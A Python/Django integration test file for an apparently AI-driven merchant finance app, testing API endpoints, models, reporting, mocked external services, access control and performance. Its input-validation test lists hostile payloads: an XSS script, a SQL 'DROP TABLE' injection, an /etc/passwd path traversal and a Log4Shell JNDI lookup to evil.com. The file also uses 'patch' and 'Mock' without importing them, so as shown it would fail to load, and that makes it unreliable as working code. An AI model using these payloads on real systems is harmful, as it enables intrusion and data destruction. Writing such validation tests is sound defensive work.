"""
Integration tests for the Merchant Financial Agent

Tests end-to-end functionality including API endpoints,
database interactions, and external service integrations.
"""

import pytest
import json
from decimal import Decimal
from django.test import TestCase, Client
from django.contrib.auth.models import User
from django.urls import reverse
from django.utils import timezone
from datetime import datetime, timedelta

from ecomapp.models import Transaction, Category, Event, Forecast, MerchantProfile
from reporting.engine import FinancialReportingEngine


class TestAPIIntegration(TestCase):
    """Test API endpoint integration"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        # Create merchant profile
        self.merchant_profile = MerchantProfile.objects.create(
            user=self.user,
            business_name='Test Business',
            business_type='RETAIL',
            base_currency='USD'
        )
        
        # Create test categories
        self.income_category = Category.objects.create(
            merchant=self.user,
            name='Sales',
            category_type='INCOME'
        )
        
        self.expense_category = Category.objects.create(
            merchant=self.user,
            name='Supplies',
            category_type='EXPENSE'
        )
        
        # Create test transactions
        self.income_transaction = Transaction.objects.create(
            merchant=self.user,
            amount=Decimal('1000.00'),
            transaction_type='INCOME',
            description='Product Sale',
            category=self.income_category,
            status='COMPLETED',
            created_by=self.user
        )
        
        self.expense_transaction = Transaction.objects.create(
            merchant=self.user,
            amount=Decimal('200.00'),
            transaction_type='EXPENSE',
            description='Office Supplies',
            category=self.expense_category,
            status='COMPLETED',
            created_by=self.user
        )
    
    def test_chat_api_integration(self):
        """Test chat API integration"""
        self.client.login(username='testmerchant', password='testpass123')
        
        response = self.client.post('/api/chat/', {
            'message': 'Show me my financial summary for this month'
        }, content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertIn('response', data)
    
    def test_function_call_api_integration(self):
        """Test function call API integration"""
        self.client.login(username='testmerchant', password='testpass123')
        
        response = self.client.post('/api/function-call/', {
            'function_name': 'financial_db_adapter.generate_summary',
            'function_args': {
                'merchant_id': self.user.id,
                'timeframe': 'month'
            }
        }, content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertIn('result', data)
    
    def test_reports_api_integration(self):
        """Test reports API integration"""
        self.client.login(username='testmerchant', password='testpass123')
        
        # Test quick report generation
        response = self.client.post('/api/reports/quick/', {
            'period': 'month'
        }, content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertTrue(data['success'])
        self.assertIn('report', data)
        
        # Test custom report generation
        end_date = timezone.now().date()
        start_date = end_date - timedelta(days=30)
        
        response = self.client.post('/api/reports/generate/', {
            'start_date': start_date.isoformat(),
            'end_date': end_date.isoformat(),
            'include_forecasts': False,
            'include_trends': True
        }, content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertTrue(data['success'])
        self.assertIn('report', data)
    
    def test_health_check_api(self):
        """Test health check API"""
        response = self.client.get('/api/health/')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        self.assertEqual(data['status'], 'ok')


class TestDatabaseIntegration(TestCase):
    """Test database integration and data consistency"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.merchant_profile = MerchantProfile.objects.create(
            user=self.user,
            business_name='Test Business',
            business_type='RETAIL',
            base_currency='USD'
        )
    
    def test_transaction_creation_and_retrieval(self):
        """Test transaction creation and retrieval"""
        category = Category.objects.create(
            merchant=self.user,
            name='Sales',
            category_type='INCOME'
        )
        
        # Create transaction
        transaction = Transaction.objects.create(
            merchant=self.user,
            amount=Decimal('500.00'),
            transaction_type='INCOME',
            description='Test Sale',
            category=category,
            status='COMPLETED',
            created_by=self.user
        )
        
        # Retrieve transaction
        retrieved_transaction = Transaction.objects.get(id=transaction.id)
        
        self.assertEqual(retrieved_transaction.amount, Decimal('500.00'))
        self.assertEqual(retrieved_transaction.merchant, self.user)
        self.assertEqual(retrieved_transaction.category, category)
    
    def test_category_hierarchy(self):
        """Test category hierarchy and relationships"""
        parent_category = Category.objects.create(
            merchant=self.user,
            name='Business Expenses',
            category_type='EXPENSE'
        )
        
        child_category = Category.objects.create(
            merchant=self.user,
            name='Office Supplies',
            category_type='EXPENSE',
            parent_category=parent_category
        )
        
        self.assertEqual(child_category.parent_category, parent_category)
        self.assertIn(child_category, parent_category.subcategories.all())
    
    def test_event_creation_and_scheduling(self):
        """Test event creation and scheduling"""
        event = Event.objects.create(
            merchant=self.user,
            title='Team Meeting',
            description='Weekly team sync',
            event_date=timezone.now() + timedelta(days=1),
            deadline_type='MEETING',
            priority='MEDIUM',
            status='UPCOMING',
            created_by=self.user
        )
        
        self.assertEqual(event.merchant, self.user)
        self.assertEqual(event.status, 'UPCOMING')
        self.assertGreater(event.event_date, timezone.now())
    
    def test_forecast_generation(self):
        """Test forecast generation and retrieval"""
        forecast = Forecast.objects.create(
            merchant=self.user,
            forecast_type='REVENUE',
            forecast_amount=Decimal('10000.00'),
            period_start=timezone.now().date(),
            period_end=timezone.now().date() + timedelta(days=30),
            currency='USD',
            confidence_level=0.8,
            notes='Based on current trends',
            created_by=self.user
        )
        
        self.assertEqual(forecast.forecast_type, 'REVENUE')
        self.assertEqual(forecast.confidence_level, 0.8)
        self.assertEqual(forecast.merchant, self.user)


class TestReportingEngineIntegration(TestCase):
    """Test reporting engine integration with database"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.merchant_profile = MerchantProfile.objects.create(
            user=self.user,
            business_name='Test Business',
            business_type='RETAIL',
            base_currency='USD'
        )
        
        # Create test data
        self.income_category = Category.objects.create(
            merchant=self.user,
            name='Sales',
            category_type='INCOME'
        )
        
        self.expense_category = Category.objects.create(
            merchant=self.user,
            name='Expenses',
            category_type='EXPENSE'
        )
        
        # Create transactions for the last 30 days
        for i in range(10):
            Transaction.objects.create(
                merchant=self.user,
                amount=Decimal('100.00') * (i + 1),
                transaction_type='INCOME',
                description=f'Sale {i + 1}',
                category=self.income_category,
                transaction_date=timezone.now() - timedelta(days=i),
                status='COMPLETED',
                created_by=self.user
            )
        
        for i in range(5):
            Transaction.objects.create(
                merchant=self.user,
                amount=Decimal('50.00') * (i + 1),
                transaction_type='EXPENSE',
                description=f'Expense {i + 1}',
                category=self.expense_category,
                transaction_date=timezone.now() - timedelta(days=i),
                status='COMPLETED',
                created_by=self.user
            )
    
    def test_comprehensive_report_generation(self):
        """Test comprehensive report generation"""
        engine = FinancialReportingEngine(self.user)
        
        end_date = timezone.now().date()
        start_date = end_date - timedelta(days=30)
        
        report = engine.generate_comprehensive_report(
            start_date=start_date,
            end_date=end_date,
            include_forecasts=True,
            include_trends=True
        )
        
        # Verify report structure
        self.assertIn('report_metadata', report)
        self.assertIn('financial_summary', report)
        self.assertIn('income_analysis', report)
        self.assertIn('expense_analysis', report)
        self.assertIn('cash_flow_analysis', report)
        self.assertIn('key_metrics', report)
        
        # Verify financial summary
        summary = report['financial_summary']
        self.assertGreater(summary['total_income'], 0)
        self.assertGreater(summary['total_expenses'], 0)
        self.assertEqual(summary['total_transactions'], 15)
    
    def test_category_breakdown_accuracy(self):
        """Test category breakdown accuracy"""
        engine = FinancialReportingEngine(self.user)
        
        end_date = timezone.now().date()
        start_date = end_date - timedelta(days=30)
        
        category_breakdown = engine._get_category_breakdown(start_date, end_date)
        
        # Verify income by category
        income_categories = category_breakdown['income_by_category']
        self.assertEqual(len(income_categories), 1)
        self.assertEqual(income_categories[0]['category__name'], 'Sales')
        
        # Verify expenses by category
        expense_categories = category_breakdown['expenses_by_category']
        self.assertEqual(len(expense_categories), 1)
        self.assertEqual(expense_categories[0]['category__name'], 'Expenses')
    
    def test_cash_flow_analysis(self):
        """Test cash flow analysis accuracy"""
        engine = FinancialReportingEngine(self.user)
        
        end_date = timezone.now().date()
        start_date = end_date - timedelta(days=30)
        
        cash_flow = engine._analyze_cash_flow(start_date, end_date)
        
        self.assertIn('daily_cash_flow', cash_flow)
        self.assertIn('total_inflow', cash_flow)
        self.assertIn('total_outflow', cash_flow)
        self.assertIn('net_cash_flow', cash_flow)
        
        # Verify cash flow calculations
        self.assertGreater(cash_flow['total_inflow'], 0)
        self.assertGreater(cash_flow['total_outflow'], 0)
        self.assertEqual(
            cash_flow['net_cash_flow'], 
            cash_flow['total_inflow'] - cash_flow['total_outflow']
        )


class TestExternalServiceIntegration(TestCase):
    """Test external service integration (mocked)"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
    
    @patch('requests.get')
    def test_currency_service_integration(self, mock_get):
        """Test currency service integration with external API"""
        # Mock external API response
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {
            'rates': {
                'EUR': 0.85,
                'GBP': 0.73
            }
        }
        mock_get.return_value = mock_response
        
        # Test currency conversion
        from mcp_servers.currency_service.currency_service import CurrencyService
        
        currency_service = CurrencyService()
        
        # This would typically be called through the orchestrator
        # but we're testing the service directly
        with patch.object(currency_service, '_get_cached_rate', return_value=None):
            result = currency_service.convert_currency({
                'amount': '100',
                'base': 'USD',
                'target': 'EUR'
            })
            
            self.assertIn('conversion', result)
            self.assertEqual(result['conversion']['original_amount'], '100')
            self.assertEqual(result['conversion']['base_currency'], 'USD')
            self.assertEqual(result['conversion']['target_currency'], 'EUR')
    
    @patch('googleapiclient.discovery.build')
    def test_google_calendar_integration(self, mock_build):
        """Test Google Calendar integration"""
        # Mock Google Calendar API
        mock_service = Mock()
        mock_events = Mock()
        mock_insert = Mock()
        mock_insert.execute.return_value = {
            'id': 'event_123',
            'htmlLink': 'https://calendar.google.com/event/123'
        }
        mock_events.insert.return_value = mock_insert
        mock_service.events.return_value = mock_events
        mock_build.return_value = mock_service
        
        from mcp_servers.google_calendar_server.calendar_server import GoogleCalendarServer
        
        calendar_server = GoogleCalendarServer()
        
        with patch.object(calendar_server, '_get_credentials') as mock_creds:
            mock_creds.return_value = Mock()
            
            result = calendar_server.calendar_create_event({
                'merchant_id': self.user.id,
                'title': 'Test Event',
                'event_date': '2024-01-16T10:00:00Z',
                'description': 'Test event description'
            })
            
            self.assertIn('id', result)
            self.assertEqual(result['id'], 'event_123')


class TestSecurityIntegration(TestCase):
    """Test security integration and access control"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.client = Client()
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.other_user = User.objects.create_user(
            username='othermerchant',
            email='other@example.com',
            password='otherpass123'
        )
    
    def test_authentication_required(self):
        """Test that authentication is required for protected endpoints"""
        protected_endpoints = [
            '/api/chat/',
            '/api/function-call/',
            '/api/reports/generate/',
            '/api/reports/quick/'
        ]
        
        for endpoint in protected_endpoints:
            response = self.client.post(endpoint, {}, content_type='application/json')
            self.assertEqual(response.status_code, 302)  # Redirect to login
    
    def test_merchant_data_isolation(self):
        """Test that merchants can only access their own data"""
        # Create transaction for first user
        Transaction.objects.create(
            merchant=self.user,
            amount=Decimal('1000.00'),
            transaction_type='INCOME',
            description='User 1 Sale',
            status='COMPLETED',
            created_by=self.user
        )
        
        # Create transaction for second user
        Transaction.objects.create(
            merchant=self.other_user,
            amount=Decimal('2000.00'),
            transaction_type='INCOME',
            description='User 2 Sale',
            status='COMPLETED',
            created_by=self.other_user
        )
        
        # Login as first user
        self.client.login(username='testmerchant', password='testpass123')
        
        # Try to access financial summary
        response = self.client.post('/api/function-call/', {
            'function_name': 'financial_db_adapter.generate_summary',
            'function_args': {
                'merchant_id': self.user.id,
                'timeframe': 'month'
            }
        }, content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        data = json.loads(response.content)
        
        # Should only include user's own transactions
        # (This would be verified by the actual implementation)
        self.assertIn('result', data)
    
    def test_input_validation(self):
        """Test input validation and sanitization"""
        self.client.login(username='testmerchant', password='testpass123')
        
        # Test with malicious input
        malicious_inputs = [
            '<script>alert("xss")</script>',
            '; DROP TABLE transactions;',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/exploit}'
        ]
        
        for malicious_input in malicious_inputs:
            response = self.client.post('/api/chat/', {
                'message': malicious_input
            }, content_type='application/json')
            
            # Should handle malicious input gracefully
            # (Either sanitize or return appropriate error)
            self.assertIn(response.status_code, [200, 400, 422])


class TestPerformanceIntegration(TestCase):
    """Test performance and scalability"""
    
    def setUp(self):
        """Set up test fixtures"""
        self.user = User.objects.create_user(
            username='testmerchant',
            email='test@example.com',
            password='testpass123'
        )
        
        self.merchant_profile = MerchantProfile.objects.create(
            user=self.user,
            business_name='Test Business',
            business_type='RETAIL',
            base_currency='USD'
        )
    
    def test_large_dataset_performance(self):
        """Test performance with large datasets"""
        import time
        
        # Create large number of transactions
        category = Category.objects.create(
            merchant=self.user,
            name='Sales',
            category_type='INCOME'
        )
        
        transactions = []
        for i in range(1000):
            transactions.append(Transaction(
                merchant=self.user,
                amount=Decimal('100.00'),
                transaction_type='INCOME',
                description=f'Sale {i}',
                category=category,
                transaction_date=timezone.now() - timedelta(days=i % 30),
                status='COMPLETED',
                created_by=self.user
            ))
        
        Transaction.objects.bulk_create(transactions)
        
        # Test report generation performance
        engine = FinancialReportingEngine(self.user)
        end_date = timezone.now().date()
        start_date = end_date - timedelta(days=30)
        
        start_time = time.time()
        report = engine.generate_comprehensive_report(start_date, end_date)
        end_time = time.time()
        
        # Should complete within reasonable time (less than 5 seconds)
        self.assertLess(end_time - start_time, 5.0)
        self.assertIn('financial_summary', report)
    
    def test_concurrent_requests_performance(self):
        """Test performance under concurrent requests"""
        import threading
        import time
        
        self.client.login(username='testmerchant', password='testpass123')
        
        results = []
        threads = []
        
        def make_request():
            start_time = time.time()
            response = self.client.post('/api/function-call/', {
                'function_name': 'financial_db_adapter.generate_summary',
                'function_args': {
                    'merchant_id': self.user.id,
                    'timeframe': 'month'
                }
            }, content_type='application/json')
            end_time = time.time()
            
            results.append({
                'status_code': response.status_code,
                'response_time': end_time - start_time
            })
        
        # Create multiple concurrent requests
        for i in range(10):
            thread = threading.Thread(target=make_request)
            threads.append(thread)
            thread.start()
        
        # Wait for all requests to complete
        for thread in threads:
            thread.join()
        
        # Verify all requests completed successfully
        self.assertEqual(len(results), 10)
        for result in results:
            self.assertEqual(result['status_code'], 200)
            # Each request should complete within reasonable time
            self.assertLess(result['response_time'], 2.0)


if __name__ == '__main__':
    pytest.main([__file__])


